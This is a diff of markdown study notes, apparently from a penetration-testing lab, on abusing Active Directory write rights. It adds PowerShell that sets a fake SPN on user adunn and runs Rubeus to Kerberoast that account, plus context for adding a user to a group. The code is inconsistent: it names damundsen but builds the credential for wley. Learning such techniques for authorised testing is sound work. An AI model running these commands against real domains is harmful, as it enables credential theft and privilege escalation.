@@ -89,14 +89,31 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 
 
 1) **Access over User account allows for:**
-  - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
+    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
 2) **Access over Group allows for:**
-  - we could `add ourselves` or another `security principal` to a given group.
+    - we could `add ourselves` or another `security principal` to a given group.
 3) **Access over Computer user allows for:**
-  - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
+    - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
 
 
-### Scenario 1 : damundsen user have GenericWrite over Help Desk Level 1 group so we can out selves 
+### Scenario 1 : damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting
+create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+create the fake SPN for `adunn` user
+```powershell
+Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+use `Rubeus` to catch the ticket 
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+### Scenario 2 : damundsen user have GenericWrite over Help Desk Level 1 group so we can out selves 
 
 
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
@@ -112,8 +129,10 @@ Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty
 
 # add your user
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
-
 ```
+
+
+
 
 ## GenericAll 
 
